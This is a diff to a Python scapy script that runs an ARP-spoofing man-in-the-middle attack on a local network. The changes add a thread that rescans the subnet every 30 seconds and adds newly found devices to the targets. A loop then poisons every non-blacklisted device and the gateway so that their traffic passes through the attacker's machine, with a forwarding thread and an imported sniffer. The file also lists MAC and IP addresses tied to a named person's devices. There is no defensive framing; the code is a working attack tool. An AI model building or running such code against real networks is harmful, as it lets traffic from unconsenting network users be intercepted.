@@ -1,16 +1,21 @@
 from scapy.all import *
 from spoofer import *
 from sniffer import *
+from app import run as run_flask
 import threading
 import time
+
+devices_lock = threading.Lock()
 
 #Configuration variables
 conf.iface = "Intel(R) Ethernet Connection (12) I219-V"
 gateway_ip = "192.168.10.1"
 
+
+ip_to_mac = {}
 devices = {
     "28:d0:43:c7:bf:6c": {"name": "Guy", "device": "Laptop", "ip" : "192.168.10.133"},
-    "72:26:6a:4f:52:1a": {"name": "Guy", "device": "iPhone", "ip" : "192.168.10.218"},
+    #"72:26:6a:4f:52:1a": {"name": "Guy", "device": "iPhone", "ip" : "192.168.10.218"},
 }
 
 
@@ -25,27 +30,43 @@ blacklisted = {
     "58:ef:68:b4:ea:49"
 }
 
-def get_all_network_devices(my_mac, gateway_mac ):
-    print("Getting all network devices...")
-    answered, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=".".join(gateway_ip.split(".")[:3]) + ".0/24"), timeout=2, verbose=0)
-    for _, received in answered:
-        mac = received.hwsrc
-        ip = received.psrc
-        if mac == my_mac or mac == gateway_mac:
-            continue
-        if mac not in devices:
-            devices[mac] = {"name": "Unknown", "device": mac, "ip": ip}
-        else:
-            devices[mac]["ip"] = ip
-    for mac, info in devices.items():
-        print(f"{info['ip']} -> {mac} ({info['name']})")
+
+def get_all_network_devices(my_mac, gateway_mac, ip_to_mac):
+    first = True
+    while True:
+        if not first:
+            time.sleep(30)
+        first = False
+
+        print("Getting all network devices...")
+        answered, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=".".join(gateway_ip.split(".")[:3]) + ".0/24"), timeout=2, verbose=0)
+        for _, received in answered:
+            mac = received.hwsrc
+            ip = received.psrc
+            if mac == my_mac or mac == gateway_mac:
+                continue
+            with devices_lock:
+                if mac not in devices:
+                    print(f"Adding device {ip} ({mac})...")
+                    devices[mac] = {"name": "Unknown", "device": mac, "ip": ip}
+                    ip_to_mac[ip] = mac
+                elif devices[mac]["ip"] != ip:
+                    old_ip = devices[mac]["ip"]
+                    devices[mac]["ip"] = ip
+                    ip_to_mac[ip] = mac
+                    ip_to_mac.pop(old_ip)
+
 
 def main():
     my_mac = get_if_hwaddr(conf.iface)
     gateway_mac = get_mac(gateway_ip)
 
-    get_all_network_devices(my_mac, gateway_mac)
     ip_to_mac = {info["ip"]: mac for mac, info in devices.items()}
+
+    scan_thread = threading.Thread(target=get_all_network_devices, args=(my_mac, gateway_mac, ip_to_mac))
+    scan_thread.daemon = True
+    scan_thread.start()
+
 
     print(f"My MAC:      {my_mac}")
     print(f"Gateway MAC: {gateway_mac}")
@@ -55,7 +76,9 @@ def main():
         forwarding_thread.daemon = True
         forwarding_thread.start()
         while True:
-            for mac, info in devices.items():
+            with devices_lock:
+                targets = list(devices.items())
+            for mac, info in targets:
                 if mac not in blacklisted:
                     spoof(info["ip"], gateway_ip, mac, my_mac)
                     spoof(gateway_ip, info["ip"], gateway_mac, my_mac)
